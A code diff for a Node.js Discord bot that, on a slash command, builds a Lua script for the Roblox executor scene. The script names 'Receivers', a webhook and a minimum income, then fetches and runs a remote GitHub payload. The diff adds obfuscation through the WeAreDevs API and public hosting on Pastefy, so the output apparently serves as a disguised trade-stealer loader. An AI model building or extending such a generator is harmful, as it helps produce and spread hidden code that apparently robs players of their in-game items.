@@ -11,6 +11,7 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 const axios = require('axios');
+const { PastefyClient } = require('@interaapps/pastefy');
 
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
@@ -20,8 +21,65 @@ const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
+const pastefy = new PastefyClient(process.env.PASTEFY_KEY);
+
+async function uploadToPastefy(code, webhookId) {
+    try {
+        log("☁️ [PASTEFY] Creating paste via Official SDK...");
+
+        // Utilisation simplifiée du SDK
+        const paste = await pastefy.createPaste({
+            title: `SABTrade`,
+            content: code,
+            visibility: 'PUBLIC' // Utilise 'UNLISTED' ou 'PUBLIC' selon tes besoins
+        });
+
+        if (paste && paste.id) {
+            const rawUrl = `https://pastefy.app/${paste.id}/raw`;
+            log(`✅ [PASTEFY] Success! ID: ${paste.id}`);
+            return rawUrl;
+        }
+        
+        return null;
+    } catch (error) {
+        log(`❌ [PASTEFY ERROR] ${error.message}`);
+        return null;
+    }
+}
 
 async function obfuscateScript(luaCode) {
+    try {
+        log("🔍 [OBF] Requesting WeAreDevs Obfuscator...");
+
+        const response = await axios.post('https://wearedevs.net/api/obfuscate', 
+        {
+            script: luaCode
+        }, 
+        {
+            headers: {
+                'accept': 'application/json',
+                'content-type': 'application/json',
+                'cookie': process.env.WRD_COOKIE, // Ta variable sur Render
+                'Referer': 'https://wearedevs.net/obfuscator',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
+            }
+        });
+
+        // On vérifie le succès selon le format que tu as reçu
+        if (response.data && response.data.success) {
+            log("✅ [OBF] WeAreDevs Success!");
+            return response.data.obfuscated; // C'est ici que se trouve le code
+        }
+
+        log("⚠️ [OBF] Failed: " + (response.data.message || "Unknown error"));
+        return null;
+
+    } catch (error) {
+        log(`❌ [OBF ERROR] ${error.message}`);
+        return null;
+    }
+}
+async function obfuscateScriptv2(luaCode) {
     try {
         log("🔍 [OBF] Step 1: Creating Session...");
 
@@ -157,8 +215,13 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'generate-sab-trade') {
-        // 1. On prévient Discord qu'on va travailler (évite le timeout de 3s)
-        await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
+        // 1. On prévient Discord qu'on travaille (indispensable pour les traitements longs)
+        try {
+            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
+        } catch (err) {
+            console.error("❌ Erreur deferReply:", err);
+            return;
+        }
 
         try {
             const usernames = interaction.options.getString('username');
@@ -166,18 +229,19 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             const income = interaction.options.getInteger('income');
             const visual = interaction.options.getString('visual') || "";
             
+            // Génération de l'ID unique
             const webhookUuid = generateWebhookId();
 
-            // 2. Sauvegarde DB
+            // 2. Sauvegarde en Base de données (MongoDB)
             const newWebhookEntry = new WebHookId({
                 webhookId: webhookUuid,
                 url: webhookUrl,
                 ownerName: interaction.user.tag
             });
-            //await newWebhookEntry.save();
-            log(`💾 [DB] Webhook mapped: ${webhookUuid}`);
+            await newWebhookEntry.save();
+            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);
 
-            // 3. Préparation Code
+            // 3. Préparation du Code Source Lua
             const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
             const codeToObfuscate = `local fenv = getfenv()
 fenv["Receivers"] = { ${userArrayLua} }
@@ -186,26 +250,39 @@ fenv["Visual"] = "${visual}"
 fenv["MinIncome"] = ${income}
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;
 
-            // 4. Obfuscation (Assure-toi que axios est importé en haut !)
+            // 4. Obfuscation via LuaObfuscator API
             const obfuscated = await obfuscateScript(codeToObfuscate);
 
             if (!obfuscated) {
-                return await interaction.editReply("❌ Obfuscation failed.");
+                return await interaction.editReply("❌ Obfuscation failed. Please check server logs.");
             }
 
-            // 5. Réponse finale (Utilise editReply car on a fait un deferReply)
+            // 5. Upload sur Pastefy
+            const pasteUrl = await uploadToPastefy(obfuscated, webhookUuid);
+
+            if (!pasteUrl) {
+                return await interaction.editReply("⚠️ Obfuscation success, but Pastefy upload failed.");
+            }
+
+            // 6. Réponse finale avec Embed professionnel
             const successEmbed = new EmbedBuilder()
-                .setTitle("🚀 Script Generated")
+                .setTitle("🛡️ Script Protected & Uploaded")
                 .setColor(0x00FF00)
-                .setDescription(`Webhook ID: \`${webhookUuid}\`\n\n**Code:**\n\`\`\`lua\n${obfuscated.substring(0, 1800)}\n\`\`\``);
+                .addFields(
+                    { name: "🆔 Webhook ID", value: `\`${webhookUuid}\``, inline: true },
+                    { name: "🔗 Raw Link", value: `[Click to Copy](${pasteUrl})`, inline: true }
+                )
+                .setDescription("### 📋 Instructions\nCopy the link above and use it in your loader or executor.\n\n*Your script is now obfuscated and hosted safely.*")
+                .setFooter({ text: `Generated for ${interaction.user.tag}` })
+                .setTimestamp();
 
             await interaction.editReply({ embeds: [successEmbed] });
 
         } catch (error) {
             log(`❌ [ERROR] ${error.message}`);
-            // En cas d'erreur après le deferReply, on utilise editReply
+            // Si on a déjà fait le deferReply, on utilise editReply pour l'erreur
             if (interaction.deferred) {
-                await interaction.editReply(`❌ Error: ${error.message}`);
+                await interaction.editReply(`❌ An error occurred: ${error.message}`).catch(() => null);
             }
         }
     }
